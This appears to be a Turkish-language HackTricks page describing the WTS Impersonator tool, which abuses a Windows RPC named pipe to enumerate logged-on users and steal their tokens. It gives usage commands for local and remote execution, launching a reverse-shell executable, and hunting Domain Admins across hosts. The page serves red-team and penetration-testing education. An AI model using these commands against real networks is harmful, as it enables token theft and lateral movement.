<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na (https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

**WTS Impersonator** aracı, geleneksel Token Taklit tekniklerini atlayarak oturum açmış kullanıcıları gizlice sıralamak ve token'larını ele geçirmek için **"\\pipe\LSM_API_service"** RPC Adlandırılmış boruyu kullanır. Bu yaklaşım, ağlar içinde sorunsuz yatay hareketleri kolaylaştırır. Bu tekniğin arkasındaki yenilik, **Omri Baso'ya aittir ve çalışması [GitHub](https://github.com/OmriBaso/WTSImpersonator)** üzerinden erişilebilir.

### Temel İşlevsellik
Araç, bir dizi API çağrısı aracılığıyla çalışır:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ana Modüller ve Kullanım
- **Kullanıcıları Sıralama**: Araçla yerel ve uzak kullanıcı sıralaması mümkündür, her iki senaryo için de komutlar kullanılır:
- Yerel olarak:
```powershell
.\WTSImpersonator.exe -m enum
```
- Uzaktan, IP adresi veya ana bilgisayar adı belirterek:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Komutların Yürütülmesi**: `exec` ve `exec-remote` modülleri işlev görmek için bir **Hizmet** bağlamına ihtiyaç duyar. Yerel yürütme sadece WTSImpersonator yürütülebilir dosyası ve bir komut gerektirir:
- Yerel komut yürütme örneği:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Bir hizmet bağlamı elde etmek için PsExec64.exe kullanılabilir:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Uzaktan Komut Yürütme**: PsExec.exe'ye benzer şekilde uzaktan bir hizmet oluşturup yükleyerek uygun izinlerle yürütme içerir.
- Uzaktan yürütme örneği:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Kullanıcı Avı Modülü**: Birden fazla makinede belirli kullanıcıları hedef alarak, kimlik bilgileri altında kod yürütme. Bu, özellikle birkaç sistemde yerel yönetici haklarına sahip Alan Yöneticilerini hedeflemek için kullanışlıdır.
- Kullanım örneği:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
